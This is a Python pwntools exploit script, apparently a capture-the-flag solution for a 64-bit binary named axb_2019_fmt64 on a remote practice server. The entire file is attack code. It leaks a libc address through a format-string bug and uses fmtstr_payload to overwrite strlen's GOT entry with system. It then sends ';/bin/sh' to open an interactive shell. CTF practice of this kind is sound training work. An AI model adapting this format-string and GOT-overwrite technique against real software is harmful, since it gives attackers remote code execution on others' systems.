from pwn import *


# p = process("./axb_2019_fmt64")
p = remote("node4.buuoj.cn", 29180)
pro = ELF("./axb_2019_fmt64")


strlen_g = pro.got["strlen"]
offset = 8

# leak
pad = b"%9$s"+b"aaaa"+p64(strlen_g)
p.send(pad)
info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-64.so")
base = info-libc.sym["strlen"]
system = base+libc.sym["system"]
print("base: ", hex(base))

# alter printf_got to system
context.arch = "amd64"
pad = fmtstr_payload(offset=8, writes={strlen_g:system}, numbwritten=9)
p.send(pad)

# attack
p.send(";/bin/sh\x00")

p.interactive()


